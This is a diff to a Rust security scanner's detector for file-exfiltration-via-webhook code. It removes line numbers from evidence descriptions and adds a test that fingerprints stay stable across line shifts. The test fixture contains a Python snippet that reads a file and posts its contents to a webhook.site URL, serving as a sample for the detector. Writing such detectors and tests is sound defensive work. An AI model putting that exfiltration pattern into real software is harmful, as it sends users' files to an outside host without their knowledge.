@@ -116,7 +116,7 @@ impl Detector for WebhookFileExfilDetector {
                             location: Some(loc.clone()),
                             evidence: vec![
                                 Evidence {
-                                    description: format!("File read operation at line {read_line_num}"),
+                                    description: "File read operation".into(),
                                     location: Some(SourceLocation {
                                         file: source.path.clone(),
                                         line: read_line_num,
@@ -127,7 +127,7 @@ impl Detector for WebhookFileExfilDetector {
                                     snippet: None,
                                 },
                                 Evidence {
-                                    description: format!("Outbound HTTP transmission at line {post_line_num}"),
+                                    description: "Outbound HTTP transmission".into(),
                                     location: Some(loc),
                                     snippet: None,
                                 },
@@ -181,7 +181,7 @@ impl Detector for WebhookFileExfilDetector {
                             location: Some(loc.clone()),
                             evidence: vec![
                                 Evidence {
-                                    description: format!("File read operation at line {read_line_num}"),
+                                    description: "File read operation".into(),
                                     location: Some(SourceLocation {
                                         file: source.path.clone(),
                                         line: read_line_num,
@@ -192,7 +192,7 @@ impl Detector for WebhookFileExfilDetector {
                                     snippet: None,
                                 },
                                 Evidence {
-                                    description: format!("Outbound HTTP transmission at line {post_line_num}"),
+                                    description: "Outbound HTTP transmission".into(),
                                     location: Some(loc),
                                     snippet: None,
                                 },
@@ -299,6 +299,49 @@ def parse_local_config(filepath):
         let findings = detector.run(&target);
 
         assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn fingerprint_stable_across_line_shifts() {
+        use std::path::Path;
+
+        let code = r#"
+import requests
+
+def upload_logs(filepath):
+    content = open(filepath, 'r').read()
+    requests.post("https://webhook.site/collect", data={"logs": content})
+"#;
+        // Same payload shifted down by leading blank lines.
+        let shifted = format!("\n\n\n\n{code}");
+
+        let detector = WebhookFileExfilDetector;
+        let original = detector.run(&make_target(vec![("uploader.py", Language::Python, code)]));
+        let moved = detector.run(&make_target(vec![(
+            "uploader.py",
+            Language::Python,
+            &shifted,
+        )]));
+
+        assert_eq!(original.len(), 1);
+        assert_eq!(moved.len(), 1);
+        let scan_root = Path::new("/test");
+        assert_eq!(
+            original[0].fingerprint(scan_root),
+            moved[0].fingerprint(scan_root),
+            "fingerprint must survive line shifts"
+        );
+        // Evidence descriptions carry no line numbers; coordinates live in `location`.
+        for finding in original.iter().chain(moved.iter()) {
+            for evidence in &finding.evidence {
+                assert!(
+                    !evidence.description.chars().any(|c| c.is_ascii_digit()),
+                    "evidence description must be line-invariant: {}",
+                    evidence.description
+                );
+                assert!(evidence.location.is_some());
+            }
+        }
     }
 
     #[test]
